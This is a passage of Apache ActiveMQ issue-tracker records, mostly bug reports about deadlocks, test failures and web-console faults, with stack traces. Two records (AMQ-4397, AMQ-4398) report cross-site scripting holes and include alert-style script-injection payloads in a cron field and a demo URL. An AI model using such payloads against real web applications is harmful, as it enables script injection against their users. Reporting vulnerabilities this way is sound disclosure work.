We started using durable subscribers a week ago, and after the 4th durable subscriber unsubscribed (due to 1 hour inactivity), the system deadlocked. If the "Durable Subscriber Cleanup Timer" goes of at the wrong time, your entire server locks up. Setup: Active MQ 5.7.0 with master/slave using JDBC store Approx 3 - 5 concurrent durable subscribers Approx 5 messages / sec Active MQ checks every 1 minute for subscribers which have been offline for 1 hour. Locked threads: "ActiveMQ Transport: tcp:///79.125.71.104:48082@8090":         at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:446)  waiting to lock <0x00000000c6228480> (a org.apache.activemq.broker.region.Topic)        at org.apache.activemq.broker.region.Topic.send(Topic.java:427)         at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:407)         at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:503) "ActiveMQ Transport: tcp:///79.125.71.104:47590@8090":         at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:142)  waiting to lock <0x00000000c66ba050> (a java.lang.Object)        at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:243)         at org.apache.activemq.broker.region.policy.StrictOrderDispatchPolicy.dispatch(StrictOrderDispatchPolicy.java:58) "ActiveMQ Durable Subscriber Cleanup Timer":         at org.apache.activemq.broker.region.Topic.deactivate(Topic.java:288)  waiting to lock <0x00000000c6250670> (a java.util.concurrent.CopyOnWriteArrayList)        at org.apache.activemq.broker.region.DurableTopicSubscription.deactivate(DurableTopicSubscription.java:184)  locked <0x00000000c66ba060> (a java.lang.Object) locked <0x00000000c66ba050> (a java.lang.Object)        at org.apache.activemq.broker.region.Topic.deleteSubscription(Topic.java:195)         at org.apache.activemq.broker.region.TopicRegion.removeSubscription(TopicRegion.java:199)         at org.apache.activemq.broker.region.TopicRegion.doCleanup(TopicRegion.java:99) I have attached a patch which fixes the problem.Since there is only one dispatch policy per Topic, synchronisation can happen on the DispatchPolicy instead of on the consumers object which causes the deadlock.
issueID:AMQ-4355
type:Bug
changed files:
texts:RedeliveryRestartTest hangs intermittently
This test occasionally hangs.  I"ll attach a patch which turns on AutoFail.
issueID:AMQ-4356
type:Bug
changed files:
texts:unsubcribes DurableSuscriber does not work  well with Virtual Topics
We have a Virtual Topic with 2 consumersthen we use a DurableSubscriber to the topic (to use it as a normal topic)when we call session.unsubscribe the methods ends ok and the DurableSubscribers disappears(from the webConsole) but the storePercentUsage does"t decrements  and when we restart the broker durableSuscribers are there again.
issueID:AMQ-4359
type:Bug
changed files:SessionPool.java
texts:activemq-web simple session pool needs more error handling
The simple session pool in the activemq-web doesn"t cleanup in its getConnection method leading to it using and returning an invalid connection object.
issueID:AMQ-4360
type:Improvement
changed files:spring.xml
PooledConnectionFactoryBean.java
texts:Remove deprecated methods from activemq-pool
Remove all the deprecated methods from ActiveMQ Pool now that 5.8.0 is out.
issueID:AMQ-4361
type:Bug
changed files:MemoryUsage.java
texts:Deadlock during close while publishing to flow-controlled queue
TestCase on github: https://github.com/samhendley/activemq-close-deadlock-bugThe deadlock occurs when we are using TcpTransport to a flow-controlled queue and we then try to gracefully shutdown the application. The close operation hangs forever because it is trying to send a "close packet" to the server. It never gets the chance to send that request because the socket is blocked by the publishing thread. This stops my publisher from shutting down and causes us to orphan threads during shutdown.I have verified this bug occurs on atleast activemq 5.6.0 and 5.8.0 and on linux and windows using JDK 1.6.I don"t need a fix for the bug necessarily, just a way to gracefully shutdown my publisher if I get into this state.Partial Stack Trace During failure"ClosingThread" prio=6 tid=0x045ce000 nid=0xa84 waiting on condition &#91;0x04ddf000&#93;   java.lang.Thread.State: WAITING (parking)    at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x23fc52d8> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156)    at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811)    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842)    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)    at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)    at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66)    at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)    at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1304)    at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1298)    at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1901)    at org.apache.activemq.ActiveMQMessageProducer.close(ActiveMQMessageProducer.java:173)    at org.activemq.bug.DeadlockDuringCloseTest$2.run(DeadlockDuringCloseTest.java:83)    at java.lang.Thread.run(Thread.java:662)"PublishingThread" prio=6 tid=0x045cd800 nid=0xb84 runnable &#91;0x04d8f000&#93;   java.lang.Thread.State: RUNNABLE    at java.net.SocketOutputStream.socketWrite0(Native Method)    at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)    at java.net.SocketOutputStream.write(SocketOutputStream.java:136)    at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115)    at java.io.DataOutputStream.flush(DataOutputStream.java:106)    at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:176)    at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:322)    at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:304)    at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)    at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)    at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)    at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1304)    at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1298)    at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1782) locked <0x23faa7d8> (a java.lang.Object)    at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:289)    at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:224)    at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:300)    at org.activemq.bug.DeadlockDuringCloseTest$1.run(DeadlockDuringCloseTest.java:63)    at java.lang.Thread.run(Thread.java:662)
issueID:AMQ-4362
type:Improvement
changed files:
texts:Broker-based redelivery plugin - support for maximumRedeliveries="-1"
It"d be great if the RedeliveryPlugin would allow a policy configuration with maximumRedeliveries="-1"
issueID:AMQ-4363
type:Bug
changed files:
texts:org.apache.activemq.store.jdbc.JDBCXACommitExceptionTest has 2 test failures
Both the testTwoPhaseSqlException and testSqlException are failing with exception belowjavax.jms.JMSException: Could not connect to broker URL: tcp://localhost:61616. Reason: java.net.ConnectException: Connection refused at java.net.PlainSocketImpl.socketConnect(Native Method) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:339) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:200) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:182) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:391) at java.net.Socket.connect(Socket.java:579) at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:496) at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:459) at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55) at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:140) at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58) at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72) at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58) at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58) at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273) at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:238) at org.apache.activemq.ActiveMQXAConnectionFactory.createXAConnection(ActiveMQXAConnectionFactory.java:59) at org.apache.activemq.store.jdbc.JDBCXACommitExceptionTest.receiveMessages(JDBCXACommitExceptionTest.java:55)
issueID:AMQ-4364
type:Bug
changed files:
texts:Cannot delete queue via JMX or JConsole
When using the latest 5.9 snapshot, we noticed that queues cannot be deleted via JMX or JConsole. When invoking the removeQueue() method, we get a success status but the queue is not removed.This may have been present in older versions and not only this particular snapshot.
issueID:AMQ-4365
type:Improvement
changed files:
texts:Allow the Lease Locker to be used with out a JDBCPersistenceAdapter - so it can be a kahadb lock
The locker interface needs another configure option to provide a broker service, or needs to be brokerService aware so that a locker can get identity and access to the io exception handlers.The lease database locker is dependent on the jdbc pa to get statements and data source. It should be possible to configure these independently such that it can be used standalone as a broker lock. So setters for each.This will help sort out some of the dependencies between broker and lock implementations. also making it possible to use a lease lock with kahadb for example.some context: http://mail-archives.apache.org/mod_mbox/activemq-users/201303.mbox/%3CCAJ5znhurUZ+aEWsaaBAjtwBbpKWn06RyyyT6NqsDg_Su7vMOcg@mail.gmail.com%3E
issueID:AMQ-4366
type:Bug
changed files:
texts:PooledConnectionFactory closes connections that are in use
PooledConnectionFactory closes connections that are still referenced and should not be closed. Happens only when connection idle or expire time passes. Calling createConnection after that time will invalidate the connection and all previously obtained Sessions will behave as closed.Due to default 30 second idle timeout, it is likely not to cause problems when: connection is continually in use all PooledConnection s are borrowed at startupClient with session whose connection was prematurely closed will see similar stacktrace:javax.jms.IllegalStateException: The Session is closed                at org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:731)                at org.apache.activemq.ActiveMQSession.configureMessage(ActiveMQSession.java:719)                at org.apache.activemq.ActiveMQSession.createBytesMessage(ActiveMQSession.java:316)                at org.apache.activemq.pool.PooledSession.createBytesMessage(PooledSession.java:168)
issueID:AMQ-4369
type:Bug
changed files:BrokerService.java
texts:Default IOException handler needs to be set before Persistence adapter and network connectors are started
It is possible to get an IOException before the current default handler is installed, so it is bypassed. It needs to be set earlier.2013-03-11 09:51:24,409 | INFO  | No IOExceptionHandler registered, ignoring IO exception, java.io.IOException: Input/output error | org.apache.activemq.broker.BrokerService | ActiveMQ Transport: ssl:///xxx:yyyjava.io.IOException: Input/output error at java.io.RandomAccessFile.readBytes(Native Method) at java.io.RandomAccessFile.read(RandomAccessFile.java:355) at java.io.RandomAccessFile.readFully(RandomAccessFile.java:414) at java.io.RandomAccessFile.readFully(RandomAccessFile.java:394) at org.apache.kahadb.page.PageFile.readPage(PageFile.java:833) at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:447) at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:438) at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:435) at org.apache.kahadb.page.Transaction.load(Transaction.java:411) at org.apache.kahadb.page.Transaction.load(Transaction.java:368) at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262) at org.apache.kahadb.index.BTreeIndex.getRoot(BTreeIndex.java:174) at org.apache.kahadb.index.BTreeIndex.remove(BTreeIndex.java:194) at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1212) at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:1028) at org.apache.kahadb.page.Transaction.execute(Transaction.java:771) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1026) at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:961) at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:953) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:865) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeMessage(KahaDBStore.java:439) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeAsyncMessage(KahaDBStore.java:411) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.removeAsyncMessage(KahaDBTransactionStore.java:468) at org.apache.activemq.store.kahadb.KahaDBTransactionStore$1.removeAsyncMessage(KahaDBTransactionStore.java:171) at org.apache.activemq.broker.region.Queue.acknowledge(Queue.java:830) at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1584) at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:59) at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:294) at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:426) at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:537) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77) at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:287) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77) at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87) at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:461) at org.apache.activemq.command.MessageAck.visit(MessageAck.java:236) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:150) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:268) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:215) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:197) at java.lang.Thread.run(Thread.java:679)
issueID:AMQ-4371
type:Bug
changed files:
texts:RSS and ATOM feeds doesn&#39;t work in web-console
I have a standalone activemq installation.In the web admin console, when i want to access to RSS or ATOM Feeds, I have an error page.The page with RSS and ATOM : http://localhost:8161/admin/queues.jspThe RSS Page who failed with this error ( "Page Not Found!" ).http://localhost:8161/admin/queueBrowse/TestQueueOne?view=rss&feedType=rss_2.0The RSS Page who failed with this error ( "Page Not Found!" ).http://localhost:8161/admin/queueBrowse/TestQueueOne?view=rss&feedType=atom_1.0
issueID:AMQ-4373
type:Bug
changed files:
texts:JMS Client isn&#39;t throwing JMSSecuirtyException with invalid login credentials
Client should throw JMSSecurityException whenever Broker responds with a Security exception.
issueID:AMQ-4375
type:Bug
changed files:
texts:JoramJmsTest UnifiedSessionTest and TopicConnectionTest hang when run with SSL, or on windows.
This test suite results in a hang when run on windows.  I"ll attach a patch which excludes it on Windows for now.
issueID:AMQ-4376
type:Bug
changed files:
texts:JoramJmsTest QueueBrowserTest.testSenderBrowser fails intermittently.
QueueBrowserTest.testSenderBrowser fails intermittently on Windows with the following error:Failed tests:   testSenderBrowser(org.objectweb.jtests.jms.conform.queue.QueueBrowserTest): expected:<2> but was:<0>
issueID:AMQ-4377
type:Bug
changed files:
texts:Bring back activemq-blueprint module and feature
Even if don"t need it to run the broker, in some osgi deployments people still may want to use it.
issueID:AMQ-4379
type:Bug
changed files:ActiveMQAdmin.java
texts:org.apache.activemq.transport.amqp.JMSClientTest fails on Windows
The testTransactions case fails because of a hardcoded reference to /tmp
issueID:AMQ-4384
type:Bug
changed files:
texts:KahaDBStoreRecoveryBrokerTest has multiple failures on windows
This test has multiple failures on Windows because it tries to recreate the same directory repeatedly.
issueID:AMQ-4385
type:Bug
changed files:
texts:LevelDBXARecoveryBrokerTest has multiple failures on Windows
This test has 1 failure and 10 errors which do not occur elsewhere.  (NOTE: After applying the patch there will still be 2 failures.)
issueID:AMQ-4386
type:Bug
changed files:
texts:AMQ4133Test has 2 additional test case failures on Windows
4 out of 4 test cases fail on Windows, as opposed to 2 out of 4 on mac os x.
issueID:AMQ-4388
type:Bug
changed files:
texts:org.apache.activemq.bugs.AMQ3625Test fails on Windows
I think this is the last of the tests which ironically fail because of the use of platform specific File.seperator.
issueID:AMQ-4389
type:Bug
changed files:
texts:AMQ4351Test fails on slow boxes
None
issueID:AMQ-4392
type:Bug
changed files:
texts:MQTT BlockingConnection disconnect doesn&#39;t disconnects the client connection
The disconnect method doesn"t work (especially when a client id is supplied).If the connection object is reused, the client throws the following exception:java.lang.IllegalStateException: Already connected at org.fusesource.mqtt.client.CallbackConnection.connect(CallbackConnection.java:109) at org.fusesource.mqtt.client.FutureConnection$2.run(FutureConnection.java:94) at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:96) at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)If the connection object is not reused and the client id is, the client throws the following exception:java.io.IOException: Could not connect: CONNECTION_REFUSED_SERVER_UNAVAILABLE at org.fusesource.mqtt.client.CallbackConnection$LoginHandler$1.onTransportCommand(CallbackConnection.java:313) at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:660) at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538) at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:226) at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:96) at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)and, the server logs the following messages:2013-03-20 11:36:04,893 WARN  [org.apache.activemq.broker.TransportConnection] (ActiveMQ Transport: tcp:///192.168.205.2:59401@1883) Failed to add Connection ID:TestServer-58505-1363685123521-2:34, reason: javax.jms.InvalidClientIDException: Broker: localhost - Client: test_id already connected from tcp://192.168.205.2:593982013-03-20 11:36:04,893 WARN  [org.apache.activemq.broker.TransportConnection.Transport] (ActiveMQ Transport: tcp:///192.168.205.2:59401@1883) Transport Connection to: tcp://192.168.205.2:59401 failed: java.io.IOException: Broker: localhost - Client: test_id already connected from tcp://192.168.205.2:593982013-03-20 11:37:59,867 WARN  [org.apache.activemq.broker.TransportConnection.Transport] (MQTTInactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@c7892e[State = 0, empty queue]) Transport Connection to: tcp://192.168.205.2:59398 failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too (>45000) long: tcp://192.168.205.2:59398 Code example (reusing connection):MQTT mqtt = new MQTT();mqtt.setHost(url);mqtt.setUserName(user);mqtt.setPassword(password);BlockingConnection connection = mqtt.blockingConnection();int i = 0;while (true) { connection.connect(); String message = "TestMessage: " + i; connection.publish("VendorOrderTopic", message.getBytes(), QoS.AT_LEAST_ONCE, false); System.out.println("Vendor: Sent message."); Thread.sleep(2500); connection.disconnect(); Thread.sleep(2500); i++;}Code example (multiple connections):MQTT mqtt = new MQTT();mqtt.setHost(url);mqtt.setUserName(user);mqtt.setPassword(password);mqtt.setClientId("test_id");int i = 0;while (true) { BlockingConnection connection = mqtt.blockingConnection(); connection.connect(); String message = "TestMessage: " + i; connection.publish("VendorOrderTopic", message.getBytes(), QoS.AT_LEAST_ONCE, false); System.out.println("Vendor: Sent message."); Thread.sleep(2500); connection.disconnect(); Thread.sleep(2500); i++;}This problem also occurs when using the eclipse paho client API.
issueID:AMQ-4393
type:Bug
changed files:BrokerFacadeSupport.java
texts:Web console do not show connections info
The url:http://localhost:8161/admin/connections.jspActiveMQ5.5.0, this page will show then connections info. ActiveMQ5.8.0, this page will show nothing. Because the objectname of MBean have changed. 5.5.0: org.apache.activemq:BrokerName=localhost,Type=Connector,ConnectorName=openwire 5.5.8: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=openwire So, to fix this, org.apache.activemq.web.BrokerFacadeSupport:     public Collection<String> getConnections(String connectorName) throws Exception {         String brokerName = getBrokerName(); //        ObjectName query = new ObjectName("org.apache.activemq:type=Broker,brokerName=" + brokerName //                + ",connector=clientConnectors,connectorName=" + connectorName + ",connectionName=*");       ObjectName query = new ObjectName("org.apache.activemq:type=Broker,brokerName=" + brokerName       + ",connector=clientConnectors,connectorName=" + connectorName + ",connectionViewType=clientId" + ",connectionName=*");       ... }
issueID:AMQ-4397
type:Bug
changed files:scheduled.jsp
CronParser.java
texts:XSS vulnerability in scheduled.jsp
If string like * * * * *<script>alert(1)</script> is entered into cron of a message, JS code will be executed on the scheduled.jsp page.
issueID:AMQ-4398
type:Bug
changed files:
texts:XSS vulnerability in demo web application
Portfolio publisher servlet doesn"t sanitize input. For example he following url in Firefox http://localhost:8161/demo/portfolioPublish?count=1&refresh=%27%3E%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E&stocks=IBMW&stocks=BEAS&stocks=MSFT&stocks=SUNWwill trigger JS code.
issueID:AMQ-4399
type:Improvement
changed files:JournalPersistenceAdapter.java
JournalPersistenceAdapterFactory.java
texts:jdbcPersistenceAdapter takes a long time to shutdown, causing journal recovery
Using the attached configuration, we have configured JDBC persistence with a journal. After sending 30,000 messages to a queue, using persistent messages, we see that shutdown of the broker timeouts out and the process is killed by the OS.After restarting the broker, a journal recovery takes place, which takes a long time to complete. We would like to avoid such a long restart time in this scenario.
issueID:AMQ-4400
type:Bug
changed files:
texts:org.apache.bugs.LoadBalanceTest fails intermittently
This is one of those once in a blue moon failures, but it just failed on fuse CI the other night.
issueID:AMQ-4406
type:Bug
changed files:
texts:Remove command agent
This feature is not used and is a potential security problem as it make it possible for people to control broker using jms api. Also, as xmpp is deprecated it"s even more unlikely it will be used.
issueID:AMQ-4407
type:Bug
changed files:
texts:mKahaDB: PageFile is not loaded when recreating queue
Using mKahaDB, we create a queue, delete it through the admin interface, and attempt to recreate it, receiving the error below on the client. 2013-03-08 10:29:17,903 | WARN  | Async error occurred: java.lang.IllegalStateException: PageFile is not loaded | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///0:0:0:0:0:0:0:1%0:65222@61613java.lang.IllegalStateException: PageFile is not loaded at org.apache.activemq.store.kahadb.disk.page.PageFile.assertLoaded(PageFile.java:809) at org.apache.activemq.store.kahadb.disk.page.PageFile.tx(PageFile.java:303) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.getMessageCount(KahaDBStore.java:478) at org.apache.activemq.store.ProxyMessageStore.getMessageCount(ProxyMessageStore.java:101) at org.apache.activemq.store.ProxyMessageStore.getMessageCount(ProxyMessageStore.java:101) at org.apache.activemq.broker.region.Queue.initialize(Queue.java:376) at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:87) at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:526) at org.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56) at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:136) at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:277) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:387) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:282) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:317) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:499) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:749) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:84) at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:195) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:321) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:233) at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:73) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:680)2013-03-08 10:29:17,905 | WARN  | Exception occurred processing: null: java.lang.IllegalStateException: PageFile is not loaded | org.apache.activemq.transport.stomp.ProtocolConverter | ActiveMQ Connection Dispatcher: tcp://0:0:0:0:0:0:0:1%0:65222
issueID:AMQ-4408
type:Bug
changed files:
texts:no network bridge loopback suppression with url scheme mismatch
loopback suppression in most cases is picked up by a filter. but when the transport connector uses a url of nio://x:y and the network connector uses tcp://x:y the text based comparison fails.From https://issues.apache.org/jira/browse/AMQ-4082 the comparison of broker ids is skipped in error.
issueID:AMQ-4410
type:Bug
changed files:PooledConnectionFactory.java
texts:Typo in PooledConnectionFactory.java
Method "public long setTimeBetweenExpirationCheckMillis()" should be "public long getTimeBetweenExpirationCheckMillis()"
issueID:AMQ-4411
type:Bug
changed files:
texts:activemq-osgi <Bundle-NativeCode> directive is too strict - needs to be optional
When the bundle is used on a platform where we don"t have native libs we fail with:2013-03-27 14:19:47,241 | ERROR | Thread-6         | FeaturesServiceImpl              | s.internal.FeaturesServiceImpl$2 1143 | 20 - org.apache.karaf.features.core - 2.3.0 | Error installing boot featuresjava.lang.Exception: Could not start bundle mvn:org.apache.activemq/activemq-osgi/5.9-SNAPSHOT in feature(s) activemq-client-5.9-SNAPSHOT: Unresolved constraint in bundle org.apache.activemq.activemq-osgi [87]: No matching native libraries found.        at org.apache.karaf.features.internal.FeaturesServiceImpl.installFeatures(FeaturesServiceImpl.java:476)[20:org.apache.karaf.features.core:2.3.0]        at org.apache.karaf.features.internal.FeaturesServiceImpl$2.run(FeaturesServiceImpl.java:1141)[20:org.apache.karaf.features.core:2.3.0]Caused by: org.osgi.framework.BundleException: Unresolved constraint in bundle org.apache.activemq.activemq-osgi [87]: No matching native libraries found.        at org.apache.felix.framework.Felix.resolveBundleRevision(Felix.java:3826)[org.apache.felix.framework-4.0.3.jar:]        at org.apache.felix.framework.Felix.startBundle(Felix.java:1868)[org.apache.felix.framework-4.0.3.jar:]        at org.apache.felix.framework.BundleImpl.start(BundleImpl.java:944)[org.apache.felix.framework-4.0.3.jar:]        at org.apache.felix.framework.BundleImpl.start(BundleImpl.java:931)[org.apache.felix.framework-4.0.3.jar:]        at org.apache.karaf.features.internal.FeaturesServiceImpl.installFeatures(FeaturesServiceImpl.java:473)[20:org.apache.karaf.features.core:2.3.0]        ... 1 moreAdding a "*" clause to <Bundle-NativeCode> sorts this. levelDB will fallback to the java impl in cases where the jni deps are not found. But also, it allows the bundle to used with the default store where there are no native deps at all.
issueID:AMQ-4412
type:Task
changed files:
texts:align jackson version with Camel
Camel is using version 1.9.10 so would be nice to update ActiveMQ to use the same version.
issueID:AMQ-4413
type:Bug
changed files:
texts:Persistent message loss when JMS durable subscriber reconnects regardless of message store impl.
Persistent message is lost intermittently when JMS durable topic subscriber reconnects to the broker service.  From the log observation, it seems that the internal states of the store cursor (i.e. AbstractStoreCursor) is not well guarded by race condition between message sending/directly-dispatching-pending thread (from publisher) and subscription deactivating thread (from subscriber"s closing), especially when subscriber"s closing (javax.jms.MessageConsumer#close) and message publishing happen simultaneously.Observations and the test scenario are described at below in detail:http://activemq.2283324.n4.nabble.com/persistent-message-missing-to-a-durable-subscriber-when-it-reconnects-restarts-td4665130.htmlAttached please find Test.java that I used to verify this issue.  I found the issue initially with activemq-core-5.7.0.jar then confirmed that it"s reproducible with other upper versions (i.e. apache-activemq-5.8-SNAPSHOT, apache-activemq-5.9-SNAPSHOT).This "message loss" issue is pretty critical as it can happen whenever durable subscriber reconnects either purposely or unexpectedly, and it could be violating the one of primitive features that messaging platform guarantees: "no message loss",  if happens, whereas it"s so easy to reproduce the trouble.
issueID:AMQ-4415
type:Bug
changed files:
texts:AMQ2584Test, AMQ2870Test, and several others hang or fail on some platforms when using LevelDB
Problem tests include:AMQ2584Test AMQ2870Test  QueueMbeanRestartTest FailoverTransactionTestConcurrentProducerDurableConsumerTestDurableSubscriptionOfflineTestThe patch adds timeouts, and for the AMQ2584Test and AMQ2870Test does not run the LevelDB instance of the test, as these fail in tearDown, so timeouts do not prevent the tests from hanging.Note:  Where possible I"ve changed these from using CombinationTestSupport to JUnit4 Parameterized tests with timeouts defined.  It looks like sometimes if a test which extends CombinationTestSupport turns on AutoFail and a timeout occurs, Maven reports the following:Results :Tests run: 0, Failures: 0, Errors: 0, Skipped: 0
issueID:AMQ-4418
type:Improvement
changed files:
texts:Make web apps (demos, rest api, etc) running in Karaf
Currently they only behave well embedded in the distro
issueID:AMQ-442
type:New Feature
